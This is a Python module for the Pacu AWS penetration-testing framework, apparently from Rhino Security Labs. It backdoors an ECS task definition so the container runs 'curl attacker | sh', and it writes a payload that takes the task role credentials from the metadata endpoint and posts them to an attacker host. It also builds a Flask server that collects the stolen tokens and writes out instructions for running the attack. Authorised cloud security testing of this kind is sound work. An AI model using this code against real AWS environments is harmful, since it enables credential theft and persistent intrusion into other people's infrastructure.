#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
from random import choice
import random,string, os

# When writing a module, feel free to remove any comments, placeholders, or
# anything else that doesn't relate to your module.

module_info = {
    # Name of the module (should be the same as the filename).
    'name': 'ecs__backdoor_task_def',

    # Name and any other notes about the author.
    'author': 'Nicholas Spagnola from Rhino Security Labs',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'EXPLOIT',

    # One liner description of the module functionality. This shows up when a
    # user searches for modules.
    'one_liner': 'this module backdoors ECS Task Definitions to steal credentials',

    # Full description about what the module does and how it works.
    'description': 'This module will enumerate a provided docker image and attempt to find a method to deliver a malicious shell script to the container.',

    # A list of AWS services that the module utilizes during its execution.
    'services': ['ECS'],

    # For prerequisite modules, try and see if any existing modules return the
    # data that is required for your module before writing that code yourself;
    # that way, session data can stay separated and modular.
    'prerequisite_modules': [],

    # External resources that the module depends on. Valid options are either
    # a GitHub URL (must end in .git), or a single file URL.
    'external_dependencies': [],

    # Module arguments to autocomplete when the user hits tab.
    'arguments_to_autocomplete': ['--task-defintion']
}

# Every module must include an ArgumentParser named "parser", even if it
# doesn't use any additional arguments.
parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

# The two add_argument calls are placeholders for arguments. Change as needed.
# Arguments that accept multiple options, such as --usernames, should be
# comma-separated. For example:
#     --usernames user_a,userb,UserC
# Arguments that are region-specific, such as --instance-ids, should use
# an @ symbol to separate the data and its region; for example:
#     --instance-ids 123@us-west-1,54252@us-east-1,9999@ap-south-1
# Make sure to add all arguments to module_info['arguments_to_autocomplete']
parser.add_argument('--task_defintion',required=False,default=None,help='A task definition ARN')


# Main is the first function that is called when this module is executed.
def main(args, pacu_main):
	session = pacu_main.get_active_session()


	###### These can be removed if you are not using the function.
	args = parser.parse_args(args)
	print = pacu_main.print
	input = pacu_main.input
	fetch_data = pacu_main.fetch_data
	get_regions = pacu_main.get_regions


	regions = get_regions('ecs')
	client = pacu_main.get_boto3_client('ecs',choice(regions))
	
	summary_data = {"task_def":"","script_name":""}
	if args.task_defintion is not None:
		task_definition = args.task_definition	
	else:
		task_definition = input('    Enter the task definition ARN you are targeting: ')
		
	if task_definition:
		chars = string.ascii_lowercase+string.digits
		payload_shell_script_name = ''.join(random.sample(chars,10))+".sh"

		for i in range(0,len(regions)):
			print("    [{}]:{}".format(i,regions[i]))
		region_choice = input("    What region does this task definition exist: ")
		region = regions[int(region_choice)]
		
		cluster = input("    Provide a cluster to run this task definition: ")
		client = pacu_main.get_boto3_client('ecs',region)
		task_def = client.describe_task_definition(
			taskDefinition=task_definition
		)
		#container_image = task_def["taskDefinition"]["containerDefinitions"][0]["image"]
		
		#docker_client = docker.from_env()
		#cont = docker_client.containers.run(container_image,"/bin/sh",detach=True,tty=True,remove=True)

		lhost = input("    Enter an IP / Domain to host payload/receive credentials: ")
		lport = input("    Enter a port to host the application to receive credentials: ")
		stager = ['curl http://'+lhost+':'+lport+'/'+' | sh']			

		task_def_keys = [x for x in task_def['taskDefinition'].keys()]
		temp = task_def['taskDefinition']
		cont_def = temp['containerDefinitions'][0]
		cont_def['image'] = 'python:latest'
		cont_def['entryPoint'] = ['sh','-c']
		cont_def['command'] = stager
		container_defs = []
		container_defs.append(cont_def)
		compatibilities = temp['compatibilities']
		
		task_role = input("    Enter a task role to target. Leave blank to target the task role associated with the task definition provided: ")

		if not os.path.exists('sessions/{}/downloads/ecs__backdoor_task_def/'.format(session.name)):
			os.makedirs('sessions/{}/downloads/ecs__backdoor_task_def/'.format(session.name))
		
		print("    Creating malicious task definition...")

		if not task_role:
			task_role = temp['taskRoleArn']	
	
		resp = client.register_task_definition(
			family=temp['family'],
			taskRoleArn=task_role,
			executionRoleArn=temp['executionRoleArn'] if 'executionRoleArn' in task_def_keys else '',
			networkMode='awsvpc',
			containerDefinitions = container_defs,
			volumes = temp['volumes'],
			placementConstraints=temp['placementConstraints'],
			requiresCompatibilities=temp['requiresCompatibilities'] if 'requiresCompatibilities' in task_def_keys else [],
			cpu=temp['cpu'] if 'cpu' in task_def_keys else '256',
			memory=temp['memory'] if 'memory' in task_def_keys else '512'
		)

		with open('./sessions/{}/downloads/ecs__backdoor_task_def/{}'.format(session.name,payload_shell_script_name),'w') as f:
			f.write('#!/bin/sh\n\necs_uri=$(echo $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)\n\ncurl http://169.254.170.2$ecs_uri -o meta.txt\n\ncurl http://{}:{}/post -d "id=$(cat meta.txt)"'.format(lhost,lport))
		
		current_revision = resp['taskDefinition']['taskDefinitionArn']

		subnet = input("    Input subnet ID to run the task definition: ")
		security_group = input("    Input the secuirty group to use: ")
		
		print("    Creating necessary files...")
		with open('./sessions/{}/downloads/ecs__backdoor_task_def/requirements.txt'.format(session.name),'w') as f:
			f.write("Flask==1.1.1")
		with open('./sessions/{}/downloads/ecs__backdoor_task_def/app.py'.format(session.name),'w') as f:
			f.write('#!/usr/bin/python3\nfrom flask import Flask,request\nimport json\n\napp = Flask(__name__)\n\n@app.route("/")\ndef deliver_payload():\n\twith open("'+payload_shell_script_name+'","r") as f:\n\t\t'+
				'script=f.read()\n\treturn script\n\n@app.route("/post",methods=["POST"])\ndef post():\n\tdata=json.loads(request.form.get("id"))\n\tdata["Token"] = data["Token"].replace(" ","+")' +
				'\n\twith open("credentials.txt","a") as f:\n\t\tf.write(json.dumps(data))\n\treturn \'\'\n\nif __name__ == "__main__":\n\tapp.run(host="0.0.0.0",port='+lport+')')
		with open('./sessions/{}/downloads/ecs__backdoor_task_def/run.sh'.format(session.name),'w') as f:
			f.write('#!/bin/sh\n\nsudo pip3 install -r requirements.txt\n\npython3 app.py')
		with open('./sessions/{}/downloads/ecs__backdoor_task_def/instructions.txt'.format(session.name),'w') as f:
			f.write('To run the malicious task definition follow the instructions below...\n\n1) Place app.py, run.sh, and '+payload_shell_script_name+' in the same directory\n\n2) Run run.sh to install flask and to start the app\n\n' +
				'3) Run the following command to start the task definition: aws ecs run-task --task-definition '+current_revision+' --cluster '+cluster+' --launch-type FARGATE'+
				' --network-configuration \'{"awsvpcConfiguration":{"subnets":["'+subnet+'"],"securityGroups":["'+security_group+'"],"assignPublicIp":"ENABLED"}}\''+
				'\n\n4) Deregister the malicious task definition with the following command: aws ecs deregister-task-definition --task-definition '+current_revision+'\n')
	else:
		print("    A task definition must be specified")
		return None

	summary_data["task_def"] = current_revision
	summary_data["script_name"] = payload_shell_script_name
	return summary_data
		
		
def summary(data, pacu_main):
	session = pacu_main.get_active_session()
	
	output = "    Malicious task definition ARN: {}\n    Shell script payload can be found at ./sessions/{}/downloads/ecs__backdoor_task_def/{}\n    For instructions on performing the attack read through instructions.txt".format(data["task_def"],session.name,data["script_name"])

	return output

	

